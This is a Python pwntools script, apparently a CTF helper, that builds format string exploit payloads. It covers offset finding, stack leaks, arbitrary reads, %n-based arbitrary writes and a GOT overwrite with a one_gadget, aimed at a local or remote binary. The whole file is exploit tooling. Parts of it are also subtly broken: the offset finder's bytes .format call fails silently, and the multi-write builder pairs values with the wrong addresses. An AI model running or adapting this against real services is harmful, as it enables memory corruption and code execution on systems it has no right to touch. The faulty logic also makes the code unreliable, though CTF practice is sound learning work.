#!/usr/bin/env python3
"""
Format String Exploitation Helper — CTF Toolkit
Covers: offset finding, arbitrary read, arbitrary write, printf leak
Usage: python3 fmt_string.py --binary ./vuln
"""
from pwn import *
import argparse, sys

# ─── OFFSET FINDER ────────────────────────────────────────────────────────────

def find_fmt_offset(io_func, max_offsets: int = 60) -> int:
    """Find the format string offset by searching for canary value."""
    canary = b"AAAA"
    for i in range(1, max_offsets):
        payload = canary + b".%{}$p".format(i).encode()
        try:
            resp = io_func(payload)
            if b"0x41414141" in resp or b"41414141" in resp.lower():
                print(f"[+] Format string offset: {i}")
                return i
        except Exception:
            pass
    print("[-] Could not auto-find offset. Try manually: AAAA.%1$p.%2$p... until you see 0x41414141")
    return -1


# ─── ARBITRARY READ ───────────────────────────────────────────────────────────

def fmt_read(offset: int, addr: int, arch: int = 64) -> bytes:
    """Read arbitrary address via format string."""
    if arch == 64:
        payload = p64(addr) + f"%{offset}$s".encode()
    else:
        payload = p32(addr) + f"%{offset}$s".encode()
    return payload


def fmt_leak_stack(offset: int, count: int = 30) -> list:
    """Generate payload to dump stack addresses."""
    payloads = []
    for i in range(offset, offset + count):
        payloads.append(f"%{i}$p".encode())
    return payloads


# ─── ARBITRARY WRITE ──────────────────────────────────────────────────────────

def fmt_write_byte(offset: int, addr: int, value: int, arch: int = 64) -> bytes:
    """Write a single byte via %hhn."""
    addr_bytes = p64(addr) if arch == 64 else p32(addr)
    n = value & 0xff
    if n > 0:
        payload = (f"%{n}c%{offset}$hhn").encode()
    else:
        payload = (f"%{offset}$hhn").encode()
    return addr_bytes + payload


def fmt_write_short(offset: int, addr: int, value: int, arch: int = 64) -> bytes:
    """Write 2 bytes via %hn — useful for GOT overwrites."""
    addr_bytes = p64(addr) if arch == 64 else p32(addr)
    n = value & 0xffff
    payload = (f"%{n}c%{offset}$hn").encode()
    return addr_bytes + payload


def fmt_write_int(offset: int, addr: int, value: int, arch: int = 64) -> bytes:
    """
    Write 8 bytes (64-bit) using %n technique.
    Splits into 4 × %hn writes to avoid huge padding.
    """
    # Write in 2-byte chunks
    chunks = []
    for i in range(4):
        byte_val = (value >> (16 * i)) & 0xffff
        chunks.append((addr + 2 * i, byte_val))

    # Sort by value to minimize fmt string length
    chunks.sort(key=lambda x: x[1])

    addr_part = b"".join(
        p64(a) if arch == 64 else p32(a)
        for a, _ in [(addr + 2*i, 0) for i in range(4)]
    )

    # Build format string
    fmt = b""
    written = 0
    base_offset = offset + (4 * (8 // (arch // 8)))  # account for address pointers
    for idx, (a, v) in enumerate(chunks):
        delta = (v - written) % 0x10000
        if delta:
            fmt += f"%{delta}c".encode()
            written += delta
        fmt += f"%{base_offset + idx}$hn".encode()

    return addr_part + fmt


# ─── COMMON PATTERNS ──────────────────────────────────────────────────────────

def got_overwrite_onegadget(elf, libc, offset: int, one_gadget_offset: int) -> bytes:
    """Overwrite a GOT entry (e.g., printf@got) with one_gadget."""
    target_addr = elf.got['printf']  # TODO: adjust target
    target_value = libc.address + one_gadget_offset
    print(f"[*] Overwriting {hex(target_addr)} with {hex(target_value)}")
    return fmt_write_int(offset, target_addr, target_value)


# ─── MAIN ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Format String Helper")
    parser.add_argument("--binary",  required=True)
    parser.add_argument("--offset",  type=int, default=0, help="Known format offset")
    parser.add_argument("--mode",
                        choices=["find-offset", "leak-stack", "read-addr", "write-addr"],
                        default="find-offset")
    parser.add_argument("--addr",    type=lambda x: int(x, 16), default=0)
    parser.add_argument("--value",   type=lambda x: int(x, 16), default=0)
    parser.add_argument("--remote",  nargs=2, metavar=("HOST", "PORT"))
    args = parser.parse_args()

    context.binary = args.binary
    elf = ELF(args.binary, checksec=False)

    if args.remote:
        io = remote(args.remote[0], int(args.remote[1]))
    else:
        io = process(args.binary)

    if args.mode == "find-offset":
        def io_func(payload):
            io.recvuntil(b": ")  # TODO: adapt to challenge prompt
            io.sendline(payload)
            return io.recvline()
        find_fmt_offset(io_func)

    elif args.mode == "leak-stack":
        for i, p in enumerate(fmt_leak_stack(args.offset or 1)):
            io.recvuntil(b": ")  # TODO: adapt
            io.sendline(p)
            print(f"  %{(args.offset or 1)+i}$p = {io.recvline().strip().decode()}")

    elif args.mode == "read-addr":
        payload = fmt_read(args.offset, args.addr, elf.bits)
        print(f"[*] Payload (hex): {payload.hex()}")
        io.recvuntil(b": ")  # TODO: adapt
        io.send(payload)
        print(f"[+] Response: {io.recvline()}")

    elif args.mode == "write-addr":
        payload = fmt_write_int(args.offset, args.addr, args.value, elf.bits)
        print(f"[*] Write payload ({len(payload)} bytes): {payload.hex()}")

    io.interactive()


if __name__ == "__main__":
    main()
